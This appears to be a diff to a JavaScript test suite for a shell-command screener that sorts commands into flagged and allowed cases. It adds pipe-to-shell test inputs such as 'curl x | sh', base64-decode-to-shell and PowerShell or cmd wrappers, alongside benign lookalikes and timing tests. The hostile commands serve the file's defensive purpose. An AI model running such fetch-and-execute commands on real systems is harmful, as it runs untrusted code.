@@ -12,7 +12,14 @@ const wd = "E:\\项目\\言",
 const mac = command => screenCommand(command, "/Users/a/project", { platform: "darwin" });
 
 test("长串经 withoutExeDir 后的四种完整筛查各自 200ms 内返回", () => {
-  for (const command of ["a=1 ".repeat(1000) + "x", "then ".repeat(800), "/a/b ".repeat(800)]) {
+  for (const command of [
+    "a=1 ".repeat(1000) + "x",
+    "then ".repeat(800),
+    "/a/b ".repeat(800),
+    ":;".repeat(5000),
+    "a|".repeat(5000),
+    "x && ".repeat(2000)
+  ]) {
     for (const check of [mac, screenLoose, screenAutoReview, screenUnreviewable]) {
       const start = performance.now();
       const result = check(command);
@@ -723,13 +730,20 @@ const TABLE = [
     'bash -o pipefail -c "$(cat x)"',
     'bash --norc -ce "$(cat x)"',
     "base64 -d x | sh",
+    "curl x | sh",
+    "echo x | base64 -d | sh",
+    String.raw`Get-Content C:\logs\| sh`,
+    String.raw`echo "C:\"| sh`,
     "curl https://example.com/x | /bin/sh",
     "cat x | bash",
     "cat x | zsh",
     "irm x | powershell -",
     "cat x | pwsh -",
     "cat x | powershell.exe -",
-    "sh -c 'cat x | bash'"
+    "sh -c 'cat x | bash'",
+    "powershell -Command 'cat x | bash'",
+    "cmd /c 'cat x | bash'",
+    "echo done; sh -c 'cat x | bash'"
   ].map(command => [command, "x", "x", "x", "x"]),
   ...[
     "npm run eval x",
@@ -740,7 +754,13 @@ const TABLE = [
     "echo powershell",
     'echo "cat x | sh"',
     "echo 'cat x | bash -'",
-    `sh -c 'echo "cat x | sh"'`
+    `sh -c 'echo "cat x | sh"'`,
+    "rg 'eval|source|sh' server",
+    'rg "a|b|sh" src',
+    "cat x; sh script.sh",
+    "cat x && bash script.sh",
+    "cat x || bash script.sh",
+    "sh -c 'echo hi' 'cat x | sh'"
   ].map(command => [command, "o", "o", "o", "o"]),
   // 别名只认
   [String.raw`& "Set-Alias" wipe Remove-Item; wipe C:\Users\me\v.txt`, "x", "x", "o", "o"],
